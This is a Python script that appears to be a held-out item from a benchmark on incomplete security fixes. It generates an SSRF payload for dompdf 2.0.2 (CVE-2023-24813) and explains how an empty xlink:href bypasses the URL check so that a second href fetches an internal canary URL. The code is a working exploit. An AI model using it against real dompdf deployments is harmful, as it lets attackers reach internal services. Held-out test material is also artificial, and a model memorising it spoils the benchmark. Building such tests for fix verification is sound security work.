#!/usr/bin/env python3
"""[HELD-OUT] CVE-2023-24813 residual exploit — SSRF that survives the CVE-2023-23924 fix.

The CVE-2023-23924 fix (patch.diff, present in V1 = dompdf 2.0.2) validates the SVG inner
<image> url in Image/Cache.php::resolve_url with:

    $url = $attributes["xlink:href"] ?? $attributes["href"];
    if (!empty($url)) { ... resolve_url($url, ...) ... }   // protocol/allowed check

Because PHP `??` only falls through on NULL/unset (NOT on an empty string), supplying a
*set-but-empty* `xlink:href=""` makes `$url = ""`, and `!empty("")` is false, so the whole
validation is SKIPPED. dompdf's image cache then hands the SVG to php-svg-lib, whose Image
tag applies BOTH attributes sequentially with `href` last — so the malicious `href` wins and
is fetched. Net: the empty `xlink:href` blinds dompdf's validator while `href` carries the
real (internal http) target.

Contract: reaches the canary (flag) on V1 (dompdf 2.0.2) => legitimate incomplete-fix
positive. CVE-2023-24813 fix (V2 = dompdf 2.0.3) validates BOTH `xlink:href` AND `href`
independently, so the non-empty `href` is caught and blocked.

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

import base64


def _svg(flag: str) -> str:
    # Empty xlink:href (blinds dompdf's `?? ` validator) + malicious href (php-svg-lib uses it).
    return (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">'
        f'<image x="0" y="0" width="120" height="120" '
        f'xlink:href="" href="http://canary:9000/{flag}"/>'
        '</svg>'
    )


def build_html(flag: str) -> str:
    b64 = base64.b64encode(_svg(flag).encode()).decode()
    return (
        '<html><body>'
        f'<img src="data:image/svg+xml;base64,{b64}"/>'
        '</body></html>'
    )


def candidate(flag: str = "PCB_FLAG") -> dict:
    return {
        "probe_id": "cve-2023-24813-empty-xlink-href-bypass",
        "method": "POST",
        "endpoint": "/render",
        "html": build_html(flag),
    }


if __name__ == "__main__":
    print(build_html("PCB_FLAG_demo"))
